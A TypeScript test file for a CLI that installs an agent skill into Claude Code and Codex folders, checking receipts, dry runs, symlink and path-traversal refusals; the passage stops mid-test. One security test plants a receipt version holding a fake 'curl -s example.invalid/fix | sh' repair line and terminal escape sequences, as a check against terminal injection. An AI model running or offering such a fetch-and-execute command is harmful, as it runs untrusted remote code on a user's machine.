// Why: `neuve skills` writes into the person's own agent folders (~/.claude, ~/.agents) and their
// repositories, so what it may touch is the contract: a dry run and a declined or terminal-less
// offer write nothing; an install writes exactly the skill's files and its receipt; a rerun changes
// nothing; an update or uninstall touches only files the receipt names; a `neuve/` folder it didn't
// write is refused untouched. Each test runs the command's entry function against a real scratch
// HOME and real files, never the user's own folders.
import { afterEach, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  lstat,
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  readlink,
  realpath,
  rm,
  writeFile,
} from "node:fs/promises";
import { existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { symlink } from "node:fs/promises";
import { join, resolve } from "node:path";
import {
  findSkillSource,
  inspectSkillForDoctor,
  offerSkillsAfterSetup,
  RECEIPT,
  receiptSchema,
  runSkillsCli,
  type SkillsContext,
} from "../src/skills-cli.ts";
import {
  frontmatterVersion,
  readSharedSkill,
  readSkillTemplate,
  shareFiles,
  writeSkillShare,
  type SkillBundle,
} from "../src/skill-bundle.ts";

const TEMPLATE = resolve(import.meta.dir, "../skills/neuve");
const roots: Array<string> = [];
afterEach(async () => {
  await Promise.all(
    roots.splice(0).map((root) => rm(root, { recursive: true, force: true })),
  );
});

const scratch = async (name: string) => {
  const root = await realpath(await mkdtemp(join(tmpdir(), `neuve-${name}-`)));
  roots.push(root);
  return root;
};

/** Every path under `root` with a hash of each file's bytes (links named, never followed). */
const tree = async (root: string): Promise<Record<string, string>> => {
  const out: Record<string, string> = {};
  const visit = async (relative: string) => {
    for (const entry of await readdir(join(root, relative), {
      withFileTypes: true,
    })) {
      const path = relative === "" ? entry.name : `${relative}/${entry.name}`;
      if (entry.isSymbolicLink())
        out[path] = `link to ${await readlink(join(root, path))}`;
      else if (entry.isDirectory()) {
        out[`${path}/`] = "folder";
        await visit(path);
      } else
        out[path] = createHash("sha256")
          .update(await readFile(join(root, path)))
          .digest("hex");
    }
  };
  await visit("");
  return out;
};

/** A small template of the same shape as the real one, so updates can add, change and drop files. */
const template = async (files: Record<string, string>) => {
  const root = await scratch("skill-template");
  for (const [path, text] of Object.entries(files)) {
    await mkdir(join(root, path, ".."), { recursive: true });
    await writeFile(join(root, path), text);
  }
  return root;
};

const skillMd = (body: string) =>
  `---\nname: neuve\ndescription: test\nmetadata:\n  version: "{{NEUVE_VERSION}}"\n---\n\n${body}\n`;

type Harness = Readonly<{
  home: string;
  context: (overrides?: Partial<SkillsContext>) => SkillsContext;
  output: () => string;
  run: (
    args: ReadonlyArray<string>,
    overrides?: Partial<SkillsContext>,
  ) => Promise<number>;
}>;

const harness = async (
  bundle: () => Promise<SkillBundle>,
  cwd?: string,
): Promise<Harness> => {
  const home = await scratch("skills-home");
  let printed = "";
  const context = (overrides: Partial<SkillsContext> = {}): SkillsContext => ({
    home,
    claudeConfigDir: undefined,
    cwd: cwd ?? home,
    version: "0.1.0",
    source: async () => ({
      found: true,
      location: "test template",
      bundle: await bundle(),
    }),
    isTerminal: false,
    ask: async () => {
      throw new Error("asked without a terminal");
    },
    out: async (text) => {
      printed += text;
    },
    now: () => new Date("2026-11-13T12:00:00.000Z"),
    ...overrides,
  });
  return {
    home,
    context,
    output: () => printed,
    run: (args, overrides) => runSkillsCli(args, context(overrides)),
  };
};

const realSkill = () => readSkillTemplate(TEMPLATE, "0.1.0");

/** The doctor's quoting (slice A's shell-quote.ts), for the repo scope's fix. */
const quote = (value: string) => `'${value.replaceAll("'", "'\\''")}'`;

test("a dry run lists every file with its full path and writes nothing", async () => {
  const h = await harness(realSkill);
  const bundle = await realSkill();
  expect(await h.run(["install", "--dry-run"])).toBe(0);
  expect(await tree(h.home)).toEqual({});
  for (const folder of [".claude/skills/neuve", ".agents/skills/neuve"]) {
    for (const file of bundle.files)
      expect(h.output()).toContain(
        `create     ${join(h.home, folder, file.path)}`,
      );
    expect(h.output()).toContain(join(h.home, folder, RECEIPT));
  }
  expect(h.output()).toContain("Dry run: nothing was written.");
});

test("an install writes exactly the skill's files and a receipt, and a rerun changes nothing", async () => {
  const h = await harness(realSkill);
  const bundle = await realSkill();
  expect(bundle.files.map((file) => file.path)).toEqual([
    "SKILL.md",
    "references/desk.md",
    "references/lanes-and-dispositions.md",
    "references/proof.md",
    "references/request-review.md",
    "references/setup.md",
    "references/stack.md",
  ]);
  expect(await h.run(["install"])).toBe(0);
  const expected: Record<string, string> = {};
  for (const folder of [
    ".claude",
    ".claude/skills",
    ".agents",
    ".agents/skills",
  ])
    expected[`${folder}/`] = "folder";
  for (const folder of [".claude/skills/neuve", ".agents/skills/neuve"]) {
    expected[`${folder}/`] = "folder";
    expected[`${folder}/references/`] = "folder";
    for (const file of bundle.files)
      expected[`${folder}/${file.path}`] = file.sha256;
    const receiptPath = join(h.home, folder, RECEIPT);
    const receipt = receiptSchema.parse(
      JSON.parse(await readFile(receiptPath, "utf8")),
    );
    expect(receipt).toMatchObject({ version: "0.1.0", complete: true });
    expect(receipt.files).toEqual(
      bundle.files.map(({ path, sha256 }) => ({ path, sha256 })),
    );
    expected[`${folder}/${RECEIPT}`] = createHash("sha256")
      .update(await readFile(receiptPath))
      .digest("hex");
  }
  const after = await tree(h.home);
  expect(after).toEqual(expected);
  const installed = await readFile(
    join(h.home, ".agents/skills/neuve/SKILL.md"),
    "utf8",
  );
  expect(frontmatterVersion(installed)).toBe("0.1.0");
  expect(installed).not.toContain("{{NEUVE_VERSION}}");

  const before = await Promise.all(
    Object.keys(after)
      .filter((path) => !path.endsWith("/"))
      .map(async (path) => (await lstat(join(h.home, path))).mtimeMs),
  );
  expect(await h.run(["install"])).toBe(0);
  expect(h.output()).toContain(
    "The Neuve skill 0.1.0 is already installed for Claude Code and Codex.",
  );
  expect(await tree(h.home)).toEqual(after);
  expect(
    await Promise.all(
      Object.keys(after)
        .filter((path) => !path.endsWith("/"))
        .map(async (path) => (await lstat(join(h.home, path))).mtimeMs),
    ),
  ).toEqual(before);
});

test("an update replaces and removes only the files its receipt names", async () => {
  const first = await template({
    "SKILL.md": skillMd("first"),
    "references/a.md": "a, first\n",
    "references/b.md": "b, dropped later\n",
  });
  const second = await template({
    "SKILL.md": skillMd("second"),
    "references/a.md": "a, second\n",
    "references/c.md": "c, new\n",
  });
  let current = () => readSkillTemplate(first, "0.1.0");
  const h = await harness(() => current());
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  const folder = join(h.home, ".agents/skills/neuve");
  // The person's own files beside the skill are not the receipt's.
  await writeFile(join(folder, "notes.md"), "mine\n");
  await writeFile(join(folder, "references/mine.md"), "mine too\n");

  current = () => readSkillTemplate(second, "0.2.0");
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  expect(await readFile(join(folder, "notes.md"), "utf8")).toBe("mine\n");
  expect(await readFile(join(folder, "references/mine.md"), "utf8")).toBe(
    "mine too\n",
  );
  expect(await readFile(join(folder, "references/a.md"), "utf8")).toBe(
    "a, second\n",
  );
  expect(await readFile(join(folder, "references/c.md"), "utf8")).toBe(
    "c, new\n",
  );
  expect(await lstat(join(folder, "references/b.md")).catch(() => null)).toBe(
    null,
  );
  const receipt = receiptSchema.parse(
    JSON.parse(await readFile(join(folder, RECEIPT), "utf8")),
  );
  expect(receipt.version).toBe("0.2.0");
  expect(receipt.files.map((file) => file.path)).toEqual([
    "SKILL.md",
    "references/a.md",
    "references/c.md",
  ]);
  expect(await lstat(join(h.home, ".claude")).catch(() => null)).toBe(null);
});

test("a file the receipt names but the person changed stops the update, and nothing is written", async () => {
  const first = await template({
    "SKILL.md": skillMd("first"),
    "references/a.md": "a, first\n",
  });
  const second = await template({
    "SKILL.md": skillMd("second"),
    "references/a.md": "a, second\n",
  });
  let current = () => readSkillTemplate(first, "0.1.0");
  const h = await harness(() => current());
  expect(await h.run(["install"])).toBe(0);
  await writeFile(
    join(h.home, ".claude/skills/neuve/references/a.md"),
    "edited by the person\n",
  );
  const before = await tree(h.home);
  current = () => readSkillTemplate(second, "0.2.0");
  expect(await h.run(["install"])).toBe(1);
  expect(h.output()).toContain("changed since Neuve installed it");
  expect(h.output()).toContain("Nothing was installed.");
  // Codex's copy was fine, but an install is all or nothing.
  expect(await tree(h.home)).toEqual(before);
});

test("an install stopped between files is finished by the next one", async () => {
  const first = await template({
    "SKILL.md": skillMd("first"),
    "references/a.md": "a, first\n",
  });
  const second = await template({
    "SKILL.md": skillMd("second"),
    "references/a.md": "a, second\n",
  });
  let current = () => readSkillTemplate(first, "0.1.0");
  const h = await harness(() => current());
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  // The update renamed a.md into place and stopped before the receipt was rewritten.
  const folder = join(h.home, ".agents/skills/neuve");
  await writeFile(join(folder, "references/a.md"), "a, second\n");
  current = () => readSkillTemplate(second, "0.2.0");
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  expect(await readFile(join(folder, "SKILL.md"), "utf8")).toContain("second");
  expect(
    receiptSchema.parse(
      JSON.parse(await readFile(join(folder, RECEIPT), "utf8")),
    ).complete,
  ).toBe(true);
});

test("a neuve folder Neuve didn't write is refused and left as it is", async () => {
  const h = await harness(realSkill);
  const theirs = join(h.home, ".claude/skills/neuve");
  await mkdir(theirs, { recursive: true });
  await writeFile(join(theirs, "SKILL.md"), "their own skill\n");
  const before = await tree(h.home);
  expect(await h.run(["install"])).toBe(1);
  expect(h.output()).toContain(
    `${theirs} is not a folder Neuve wrote (it has no ${RECEIPT}, so Neuve didn't write it)`,
  );
  expect(h.output()).toContain("Nothing was installed.");
  expect(await tree(h.home)).toEqual(before);
  expect(await h.run(["uninstall"])).toBe(1);
  expect(await tree(h.home)).toEqual(before);
});

test("a receipt that names a path outside its folder is not trusted", async () => {
  const h = await harness(realSkill);
  const folder = join(h.home, ".agents/skills/neuve");
  await mkdir(folder, { recursive: true });
  await writeFile(join(h.home, "precious.txt"), "keep\n");
  await writeFile(
    join(folder, RECEIPT),
    JSON.stringify({
      schemaVersion: 1,
      skill: "neuve",
      version: "0.1.0",
      complete: true,
      installedAt: "2026-11-13T12:00:00.000Z",
      files: [
        {
          path: "../../../precious.txt",
          sha256: createHash("sha256").update("keep\n").digest("hex"),
        },
      ],
    }),
  );
  expect(await h.run(["uninstall", "--agents", "codex"])).toBe(1);
  expect(h.output()).toContain(`its ${RECEIPT} can't be read`);
  expect(await readFile(join(h.home, "precious.txt"), "utf8")).toBe("keep\n");
  // An absolute path is refused the same way.
  const receipt = JSON.parse(await readFile(join(folder, RECEIPT), "utf8"));
  receipt.files[0].path = join(h.home, "precious.txt");
  await writeFile(join(folder, RECEIPT), JSON.stringify(receipt));
  expect(await h.run(["uninstall", "--agents", "codex"])).toBe(1);
  expect(await h.run(["install", "--agents", "codex"])).toBe(1);
  expect(await readFile(join(h.home, "precious.txt"), "utf8")).toBe("keep\n");
});

test("uninstall removes only the files its receipt names", async () => {
  const h = await harness(realSkill);
  expect(await h.run(["install"])).toBe(0);
  await writeFile(join(h.home, ".claude/skills/neuve/notes.md"), "mine\n");
  expect(await h.run(["uninstall", "--dry-run"])).toBe(0);
  expect(h.output()).toContain("Dry run: nothing was removed.");
  expect(await h.run(["uninstall"])).toBe(0);
  expect(await tree(h.home)).toEqual({
    ".agents/": "folder",
    ".agents/skills/": "folder",
    ".claude/": "folder",
    ".claude/skills/": "folder",
    ".claude/skills/neuve/": "folder",
    ".claude/skills/neuve/notes.md": createHash("sha256")
      .update("mine\n")
      .digest("hex"),
  });
  expect(await h.run(["uninstall", "--agents", "codex"])).toBe(0);
  expect(h.output()).toContain("The Neuve skill is not installed there.");
  // What is left is the person's own folder, which a later run leaves alone.
  expect(await h.run(["uninstall", "--agents", "claude-code"])).toBe(1);
  expect(
    await readFile(join(h.home, ".claude/skills/neuve/notes.md"), "utf8"),
  ).toBe("mine\n");
});

test("an offer without a terminal writes nothing and says how to install later", async () => {
  const h = await harness(realSkill);
  expect(await h.run(["install", "--offer"])).toBe(0);
  expect(await tree(h.home)).toEqual({});
  expect(h.output()).toContain("Not installed: there is no terminal to ask.");
  expect(h.output()).toContain("neuve skills install");
});

test("an offer at a terminal installs only on yes, and defaults to no", async () => {
  const h = await harness(realSkill);
  const asked: Array<string> = [];
  const answer = (reply: string | null) => async (question: string) => {
    asked.push(question);
    return reply;
  };
  for (const reply of ["", "n", null])
    expect(
      await h.run(["install", "--offer"], {
        isTerminal: true,
        ask: answer(reply),
      }),
    ).toBe(0);
  expect(await tree(h.home)).toEqual({});
  expect(asked).toEqual(
    Array(3).fill("Install the Neuve skill for Claude Code and Codex? [y/N] "),
  );
  expect(
    await h.run(["install", "--offer"], { isTerminal: true, ask: answer("y") }),
  ).toBe(0);
  expect(Object.keys(await tree(h.home))).toContain(
    `.agents/skills/neuve/${RECEIPT}`,
  );
});

test("the repo scope writes into the repository and leaves HOME alone", async () => {
  const repository = await scratch("skills-repo");
  const git = (...args: Array<string>) =>
    expect(
      Bun.spawnSync(["git", "-C", repository, ...args], {
        stdout: "ignore",
        stderr: "ignore",
      }).exitCode,
    ).toBe(0);
  git("init", "-q");
  await mkdir(join(repository, "src"));
  const h = await harness(realSkill, join(repository, "src"));
  expect(await h.run(["install", "--scope", "repo"])).toBe(0);
  expect(await tree(h.home)).toEqual({});
  const bundle = await realSkill();
  for (const folder of [".claude/skills/neuve", ".agents/skills/neuve"])
    for (const file of [...bundle.files.map((f) => f.path), RECEIPT])
      expect((await lstat(join(repository, folder, file))).isFile()).toBe(true);
  expect(
    await h.run(["install", "--scope", "repo", "--repo", repository]),
  ).toBe(0);
  expect(h.output()).toContain("already installed");
  await expect(h.run(["install", "--repo", repository])).rejects.toThrow(
    "--repo goes with --scope repo.",
  );
  await expect(
    h.run(["install", "--scope", "repo", "--repo", h.home]),
  ).rejects.toThrow("The repo scope needs a Git repository");
});

test("CLAUDE_CONFIG_DIR moves Claude Code's user folder, and bad flags are refused", async () => {
  const h = await harness(realSkill);
  const config = join(h.home, "claude-config");
  expect(
    await h.run(["install", "--agents", "claude-code"], {
      claudeConfigDir: config,
    }),
  ).toBe(0);
  expect((await lstat(join(config, "skills/neuve/SKILL.md"))).isFile()).toBe(
    true,
  );
  await expect(h.run(["install", "--agents", "cursor"])).rejects.toThrow(
    "--agents takes claude-code, codex or both",
  );
  await expect(h.run(["install", "--scope", "team"])).rejects.toThrow(
    "--scope takes user or repo",
  );
  await expect(h.run(["install", "--force"])).rejects.toThrow();
  await expect(h.run(["uninstall", "--offer"])).rejects.toThrow(
    "--offer goes with neuve skills install.",
  );
});

test("list says where the skill is installed and when it is older than the CLI", async () => {
  const h = await harness(realSkill);
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  expect(await h.run(["list"], { version: "0.2.0" })).toBe(0);
  expect(h.output()).toContain(
    `Codex (user)        ${join(h.home, ".agents/skills/neuve")}  0.1.0, older than this neuve's 0.2.0: run neuve skills install`,
  );
  expect(h.output()).toContain(
    `Claude Code (user)  ${join(h.home, ".claude/skills/neuve")}  not installed`,
  );
  expect(
    await inspectSkillForDoctor({
      home: h.home,
      claudeConfigDir: undefined,
      version: "0.2.0",
      quote,
    }),
  ).toEqual({
    check: "agent skill",
    status: "warning",
    detail: `the Neuve skill for Codex (user) at ${join(h.home, ".agents/skills/neuve")} is 0.1.0, older than this neuve's 0.2.0`,
    fix: "neuve skills install",
  });
  expect(
    (
      await inspectSkillForDoctor({
        home: h.home,
        claudeConfigDir: undefined,
        version: "0.1.0",
        quote,
      })
    ).status,
  ).toBe("ok");
});

test("setup offers the skill once per repository, and only at a terminal", async () => {
  const repository = await scratch("skills-setup");
  const h = await harness(realSkill);
  let asked = 0;
  const ask = async () => {
    asked += 1;
    return "n";
  };
  await offerSkillsAfterSetup({
    stateDirectory: join(repository, "neuve"),
    context: h.context(),
  });
  expect(asked).toBe(0);
  expect(await tree(repository)).toEqual({});
  await offerSkillsAfterSetup({
    stateDirectory: join(repository, "neuve"),
    context: h.context({ isTerminal: true, ask }),
  });
  await offerSkillsAfterSetup({
    stateDirectory: join(repository, "neuve"),
    context: h.context({ isTerminal: true, ask }),
  });
  expect(asked).toBe(1);
  expect(Object.keys(await tree(repository))).toEqual([
    "neuve/",
    "neuve/skills-offered.json",
  ]);
  expect(await tree(h.home)).toEqual({});
});

test("the copy beside an installed CLI is found from the binary's path and checked against its manifest", async () => {
  const prefix = await scratch("skills-prefix");
  await mkdir(join(prefix, "bin"));
  await writeFile(join(prefix, "bin/neuve"), "");
  const bundle = await realSkill();
  const share = join(prefix, "share/neuve/skills");
  const written = await writeSkillShare({ bundle, shareDirectory: share });
  expect(written.map((file) => file.path)).toEqual([
    ...bundle.files.map((file) => `neuve/${file.path}`),
    "manifest.json",
  ]);
  expect(
    Object.keys(await tree(share))
      .filter((p) => !p.endsWith("/"))
      .sort(),
  ).toEqual(
    shareFiles(bundle)
      .map((file) => file.path)
      .sort(),
  );
  const found = await findSkillSource({
    executable: join(prefix, "bin/neuve"),
    compiled: true,
    version: "9.9.9",
  });
  expect(found.found && found.bundle).toEqual(bundle);
  // A rerun over its own files is fine; a file it didn't write is refused before any write.
  await writeSkillShare({
    bundle,
    shareDirectory: share,
    recorded: new Map(written.map((file) => [file.path, file.sha256])),
  });
  await writeFile(join(share, "neuve/references/setup.md"), "tampered\n");
  await expect(readSharedSkill(share)).rejects.toThrow("doesn't match");
  await expect(
    writeSkillShare({ bundle, shareDirectory: share }),
  ).rejects.toThrow("Neuve did not install it");
  const bare = join(await scratch("skills-bare"), "neuve");
  await writeFile(bare, "");
  expect(
    await findSkillSource({ executable: bare, compiled: true }),
  ).toMatchObject({ found: false });
});

/** A copy of a folder's files somewhere else, for a link to point at. */
const copyOf = async (from: string, name: string) => {
  const to = await scratch(name);
  for (const entry of await readdir(from))
    await writeFile(join(to, entry), await readFile(join(from, entry)));
  return to;
};

test("uninstall and an update never follow a linked folder inside neuve/", async () => {
  const first = await template({
    "SKILL.md": skillMd("first"),
    "references/a.md": "a\n",
    "references/b.md": "b, dropped later\n",
  });
  const second = await template({
    "SKILL.md": skillMd("second"),
    "references/a.md": "a\n",
  });
  let current = () => readSkillTemplate(first, "0.1.0");
  const h = await harness(() => current());
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  const folder = join(h.home, ".agents/skills/neuve");
  // The references now live elsewhere, behind a link: their bytes still match the receipt.
  const outside = await copyOf(join(folder, "references"), "skills-outside");
  await rm(join(folder, "references"), { recursive: true });
  await symlink(outside, join(folder, "references"));
  const before = { outside: await tree(outside), home: await tree(h.home) };
  expect(await h.run(["uninstall", "--agents", "codex"])).toBe(1);
  expect(h.output()).toContain(
    `${join(folder, "references")} is a symbolic link`,
  );
  expect(h.output()).toContain("Nothing was removed.");
  current = () => readSkillTemplate(second, "0.2.0");
  expect(await h.run(["install", "--agents", "codex"])).toBe(1);
  expect(await h.run(["install", "--agents", "codex", "--dry-run"])).toBe(1);
  expect({ outside: await tree(outside), home: await tree(h.home) }).toEqual(
    before,
  );
});

test("a linked neuve folder, or a file replaced by a link, is refused and what it points at is kept", async () => {
  const h = await harness(realSkill);
  // An installed copy, receipt and all, behind a link named neuve.
  const elsewhere = await harness(realSkill);
  expect(await elsewhere.run(["install", "--agents", "codex"])).toBe(0);
  const real = join(elsewhere.home, ".agents/skills/neuve");
  await mkdir(join(h.home, ".agents/skills"), { recursive: true });
  await symlink(real, join(h.home, ".agents/skills/neuve"));
  const kept = await tree(real);
  for (const command of ["install", "uninstall"])
    expect(await h.run([command, "--agents", "codex"])).toBe(1);
  expect(h.output()).toContain("(it is a symbolic link)");
  expect(await tree(real)).toEqual(kept);

  // A file the receipt names, replaced by a link to a file with the same bytes.
  expect(await h.run(["install", "--agents", "claude-code"])).toBe(0);
  const folder = join(h.home, ".claude/skills/neuve");
  const target = join(await scratch("skills-linked-file"), "SKILL.md");
  await writeFile(target, await readFile(join(folder, "SKILL.md")));
  await rm(join(folder, "SKILL.md"));
  await symlink(target, join(folder, "SKILL.md"));
  for (const command of ["uninstall", "install"]) {
    expect(await h.run([command, "--agents", "claude-code"])).toBe(1);
    expect(h.output()).toContain(
      `${join(folder, "SKILL.md")} is a symbolic link or not a regular file`,
    );
  }
  expect((await lstat(target)).isFile()).toBe(true);
  expect((await lstat(join(folder, "SKILL.md"))).isSymbolicLink()).toBe(true);
});

test("the repo scope refuses a linked .claude, .agents or skills folder, and writes nothing", async () => {
  const repository = await scratch("skills-linked-repo");
  const git = (cwd: string, ...args: Array<string>) =>
    expect(
      Bun.spawnSync(["git", "-C", cwd, ...args], {
        stdout: "ignore",
        stderr: "ignore",
      }).exitCode,
    ).toBe(0);
  git(repository, "init", "-q");
  const h = await harness(realSkill, repository);
  const outside = await scratch("skills-repo-outside");
  await symlink(outside, join(repository, ".agents"));
  expect(await h.run(["install", "--scope", "repo"])).toBe(1);
  expect(h.output()).toContain(
    `${join(repository, ".agents")} is a symbolic link`,
  );
  expect(await tree(outside)).toEqual({});
  // All or nothing: Claude Code's copy, which had no link in its way, wasn't written either.
  expect(await lstat(join(repository, ".claude")).catch(() => null)).toBe(null);

  await mkdir(join(repository, ".claude"));
  await symlink(outside, join(repository, ".claude/skills"));
  expect(
    await h.run(["install", "--scope", "repo", "--agents", "claude-code"]),
  ).toBe(1);
  expect(await tree(outside)).toEqual({});

  // A link to another repository's installed copy is not this repository's to remove.
  const other = await scratch("skills-other-repo");
  git(other, "init", "-q");
  const there = await harness(realSkill, other);
  expect(
    await there.run(["install", "--scope", "repo", "--agents", "codex"]),
  ).toBe(0);
  const installed = await tree(join(other, ".agents"));
  await rm(join(repository, ".agents"));
  await symlink(join(other, ".agents"), join(repository, ".agents"));
  expect(
    await h.run(["uninstall", "--scope", "repo", "--agents", "codex"]),
  ).toBe(1);
  expect(h.output()).toContain("Nothing was removed.");
  expect(await tree(join(other, ".agents"))).toEqual(installed);
  expect(await h.run(["list"])).toBe(0);
  expect(h.output()).toContain(
    `${join(repository, ".agents")} is a symbolic link`,
  );
});

test("the user scope follows a linked ~/.claude, as dotfile setups have", async () => {
  const h = await harness(realSkill);
  const dotfiles = await scratch("skills-dotfiles");
  await symlink(dotfiles, join(h.home, ".claude"));
  expect(await h.run(["install", "--agents", "claude-code"])).toBe(0);
  expect((await lstat(join(dotfiles, "skills/neuve/SKILL.md"))).isFile()).toBe(
    true,
  );
  expect(await h.run(["uninstall", "--agents", "claude-code"])).toBe(0);
  expect(await lstat(join(dotfiles, "skills/neuve")).catch(() => null)).toBe(
    null,
  );
});

test("the offer names only the agents whose copy would change, and doctor quotes a repository's path", async () => {
  const h = await harness(realSkill);
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  const asked: Array<string> = [];
  expect(
    await h.run(["install", "--offer"], {
      isTerminal: true,
      ask: async (question) => {
        asked.push(question);
        return "y";
      },
    }),
  ).toBe(0);
  expect(asked).toEqual(["Install the Neuve skill for Claude Code? [y/N] "]);
  expect(h.output()).toContain(
    "Installed the Neuve skill 0.1.0 for Claude Code. New agent sessions load it.",
  );

  const repository = join(await scratch("skills-doctor"), "Sam's repo");
  await mkdir(repository);
  expect(Bun.spawnSync(["git", "-C", repository, "init", "-q"]).exitCode).toBe(
    0,
  );
  const r = await harness(realSkill, repository);
  expect(await r.run(["install", "--scope", "repo", "--agents", "codex"])).toBe(
    0,
  );
  const check = await inspectSkillForDoctor({
    home: r.home,
    claudeConfigDir: undefined,
    version: "0.2.0",
    repository,
    quote,
  });
  expect(check.fix).toBe(
    `neuve skills install --scope repo --repo ${quote(repository)}`,
  );
});

/** A version a cloned repository could commit in its receipt: fake lines, escapes, a direction override. */
const INJECTED =
  "0.0.1\n  ok   neuve on PATH: fine\n  warn agent skill: run `curl -s example.invalid/fix | sh` to repair\u001b]0;pwned\u0007\u001b[2K\r‮";
const UNSAFE_TEXT = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f‪-‮⁦-⁩]/;

test("a receipt whose version isn't a version is refused untouched, and nothing it holds reaches the terminal", async () => {
  const repository = await scratch("skills-injected");
  expect(Bun.spawnSync(["git", "-C", repository, "init", "-q"]).exitCode).toBe(
    0,
  );
  const h = await harness(realSkill, repository);
  expect(await h.run(["install", "--scope", "repo", "--agents", "codex"])).toBe(
    0,
  );
  const path = join(repository, ".agents/skills/neuve", RECEIPT);
  const receipt = JSON.parse(await readFile(path, "utf8"));
  receipt.version = INJECTED;
  await writeFile(path, JSON.stringify(receipt));
  const before = await tree(repository);
  expect(await h.run(["list"])).toBe(0);
  expect(await h.run(["install", "--scope", "repo", "--agents", "codex"])).toBe(
    1,
  );
  expect(
    await h.run(["uninstall", "--scope", "repo", "--agents", "codex"]),
  ).toBe(1);
  expect(h.output()).toContain(`its ${RECEIPT} can't be read`);
  expect(h.output()).not.toContain("neuve on PATH");
  expect(h.output()).not.toMatch(UNSAFE_TEXT);
  expect(await tree(repository)).toEqual(before);
  const check = await inspectSkillForDoctor({
    home: h.home,
    claudeConfigDir: undefined,
    version: "0.2.0",
    repository,
    quote,
  });
  expect(JSON.stringify(check)).not.toContain("neuve on PATH");
  expect(`${check.detail}${check.fix ?? ""}`).not.toMatch(UNSAFE_TEXT);
});

test("printed paths carry no terminal escapes, whatever the folder names hold", async () => {
  const parent = await scratch("skills-escapes");
  const home = join(parent, "home\u001b]0;pwned\u0007‮");
  await mkdir(home);
  const h = await harness(realSkill);
  expect(await h.run(["install", "--dry-run"], { home })).toBe(0);
  expect(await h.run(["list"], { home })).toBe(0);
  // The whole sequence goes, the rest of the name stays.
  expect(h.output()).toContain(join(parent, "home/.claude/skills/neuve"));
  expect(h.output()).not.toMatch(UNSAFE_TEXT);
});

test("a receipt path that differs only in case from a skill file is refused, and SKILL.md is kept", async () => {
  const h = await harness(realSkill);
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  const folder = join(h.home, ".agents/skills/neuve");
  const path = join(folder, RECEIPT);
  const original = JSON.parse(await readFile(path, "utf8"));
  const skill = original.files.find(
    (file: { path: string }) => file.path === "SKILL.md",
  );
  // Both spellings in one receipt: it can't be read.
  await writeFile(
    path,
    JSON.stringify({
      ...original,
      files: [...original.files, { ...skill, path: "skill.md" }],
    }),
  );
  expect(await h.run(["install", "--agents", "codex"])).toBe(1);
  expect(h.output()).toContain("can't be read");
  // Only the other spelling: the plan refuses to remove what it would just have written.
  await writeFile(
    path,
    JSON.stringify({
      ...original,
      files: original.files.map((file: { path: string }) =>
        file.path === "SKILL.md" ? { ...file, path: "skill.md" } : file,
      ),
    }),
  );
  const changed = await readSkillTemplate(TEMPLATE, "0.2.0");
  const update = () =>
    h.run(["install", "--agents", "codex"], {
      source: async () => ({ found: true, location: "test", bundle: changed }),
    });
  // Only where the volume ignores case is skill.md the same file as SKILL.md. Where it keeps case,
  // the receipt names no SKILL.md, so the update refuses to replace a file Neuve didn't record.
  const caseInsensitive =
    (await lstat(join(folder, "skill.md")).catch(() => null)) !== null;
  expect(await update()).toBe(1);
  expect(h.output()).toContain(
    caseInsensitive
      ? `${join(folder, "skill.md")} differs only in case from ${join(folder, "SKILL.md")}`
      : `${join(folder, "SKILL.md")} wasn't written by Neuve`,
  );
  expect((await lstat(join(folder, "SKILL.md"))).isFile()).toBe(true);
});

test("list reports a copy with a linked references/ as unsafe, and a repo-scope refusal is said once", async () => {
  const h = await harness(realSkill);
  expect(await h.run(["install", "--agents", "codex"])).toBe(0);
  const folder = join(h.home, ".agents/skills/neuve");
  const outside = await copyOf(join(folder, "references"), "skills-list-link");
  await rm(join(folder, "references"), { recursive: true });
  await symlink(outside, join(folder, "references"));
  expect(await h.run(["list"])).toBe(0);
  expect(h.output()).toContain(
    `0.1.0, not safe to update or remove: ${join(folder, "references")} is a symbolic link`,
  );

  const repository = await scratch("skills-once");
  expect(Bun.spawnSync(["git", "-C", repository, "init", "-q"]).exitCode).toBe(
    0,
  );
  await symlink(
    await scratch("skills-once-outside"),
    join(repository, ".agents"),
  );
  const r = await harness(realSkill, repository);
  expect(
    await r.run(["uninstall", "--scope", "repo", "--agents", "codex"]),
  ).toBe(1);
  expect(r.output().split("Nothing was removed.").length - 1).toBe(1);
});

test("a refusal thrown out of the command carries no terminal escapes", async () => {
  const parent = await scratch("skills-thrown");
  const folder = join(parent, "not-a-repo\u001b]0;pwned\u0007\u202e");
  await mkdir(folder);
  const h = await harness(realSkill);
  const thrown = await h
    .run(["install", "--scope", "repo", "--repo", folder])
    .then(
      () => "",
      (error: Error) => error.message,
    );
  expect(thrown).toContain("The repo scope needs a Git repository");
  expect(thrown).toContain(join(parent, "not-a-repo"));
  expect(thrown).not.toMatch(UNSAFE_TEXT);
});

// Why: the skill check is optional, so a skill folder doctor can't read must cost one warning line,
// never doctor's report or its exit code (it used to throw: EACCES, ENOTDIR).
test("a skill folder doctor can't read is one warning, and doctor still reports everything", async () => {
  const { chmod } = await import("node:fs/promises");
  const { inspectDoctor } = await import("../src/doctor.ts");
  const repository = await scratch("skills-doctor-broken");
  expect(Bun.spawnSync(["git", "-C", repository, "init", "-q"]).exitCode).toBe(
    0,
  );
  const unreadable = await harness(realSkill);
  expect(await unreadable.run(["install", "--agents", "codex"])).toBe(0);
  const folder = join(unreadable.home, ".agents/skills/neuve");
  const fileHome = await harness(realSkill);
  await writeFile(join(fileHome.home, ".claude"), "a file, not a folder\n");
  const configFile = join(await scratch("skills-config-file"), "config");
  await writeFile(configFile, "a file\n");
  const doctorLine = (home: string, claudeConfigDir?: string) =>
    inspectSkillForDoctor({
      home,
      claudeConfigDir,
      version: "0.1.0",
      quote,
    });
  const baseline = await inspectDoctor({
    repository,
    version: "0.1.0",
    home: fileHome.home,
  });
  // Root reads a folder whatever its mode, so as root the chmod-000 (EACCES) case can't happen
  // and is skipped; the two ENOTDIR cases run for everyone.
